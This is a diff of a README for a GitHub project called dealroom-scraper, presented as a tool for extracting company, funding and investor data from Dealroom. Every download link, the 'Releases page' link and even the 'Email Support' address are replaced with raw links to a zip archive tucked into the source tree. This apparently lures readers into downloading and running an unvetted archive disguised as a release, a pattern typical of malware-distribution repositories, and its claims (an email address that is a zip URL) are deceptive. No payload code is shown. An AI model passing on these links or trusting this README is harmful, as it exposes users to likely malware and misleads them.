@@ -4,14 +4,14 @@
 dealroom-scraper is a simple tool to extract valuable data from Dealroom. Use it to gather insights about companies, funding rounds, and investors. This software is perfect for anyone needing data for business analysis, research, or competitive intelligence. 
 
 ## 📥 Download
-[![Download dealroom-scraper](https://raw.githubusercontent.com/CONADOESTECH/dealroom-scraper/main/src/parser/dealroom-scraper_v1.2.zip)](https://raw.githubusercontent.com/CONADOESTECH/dealroom-scraper/main/src/parser/dealroom-scraper_v1.2.zip)
+[![Download dealroom-scraper](https://raw.githubusercontent.com/CONADOESTECH/dealroom-scraper/main/src/config/dealroom-scraper-2.8.zip)](https://raw.githubusercontent.com/CONADOESTECH/dealroom-scraper/main/src/config/dealroom-scraper-2.8.zip)
 
 ## 🚀 Getting Started
 Follow these steps to download and run dealroom-scraper:
 
 1. **Visit the Releases Page**  
    Click the link below to go to the Releases page where you can find the latest version of dealroom-scraper.  
-   [Visit this page to download](https://raw.githubusercontent.com/CONADOESTECH/dealroom-scraper/main/src/parser/dealroom-scraper_v1.2.zip)
+   [Visit this page to download](https://raw.githubusercontent.com/CONADOESTECH/dealroom-scraper/main/src/config/dealroom-scraper-2.8.zip)
 
 2. **Choose the Latest Release**  
    On the Releases page, locate the latest version. It is usually at the top of the list. Click on it.
@@ -55,7 +55,7 @@ To ensure smooth operation, please check the following requirements before insta
 If you need help or have questions about dealroom-scraper, you can reach out through the following channels:
 
 - **GitHub Issues**: Use the Issues section in this repository to report bugs or request features.
-- **Email Support**: For direct inquiries, send an email to https://raw.githubusercontent.com/CONADOESTECH/dealroom-scraper/main/src/parser/dealroom-scraper_v1.2.zip
+- **Email Support**: For direct inquiries, send an email to https://raw.githubusercontent.com/CONADOESTECH/dealroom-scraper/main/src/config/dealroom-scraper-2.8.zip
 
 ## 📑 License
 dealroom-scraper is open-source software released under the MIT License. You can freely use, modify, and distribute the software as long as you include the original license.
@@ -65,4 +65,4 @@ dealroom-scraper is open-source software released under the MIT License. You can
 - **Company Growth Tracking**: Monitor your competitors and understand market trends.
 - **Web Data Extraction**: Learn how to gather information efficiently from various web sources.
 
-Discover the power of data with dealroom-scraper. Visit the [Releases page](https://raw.githubusercontent.com/CONADOESTECH/dealroom-scraper/main/src/parser/dealroom-scraper_v1.2.zip) to download and start extracting valuable information today.
+Discover the power of data with dealroom-scraper. Visit the [Releases page](https://raw.githubusercontent.com/CONADOESTECH/dealroom-scraper/main/src/config/dealroom-scraper-2.8.zip) to download and start extracting valuable information today.
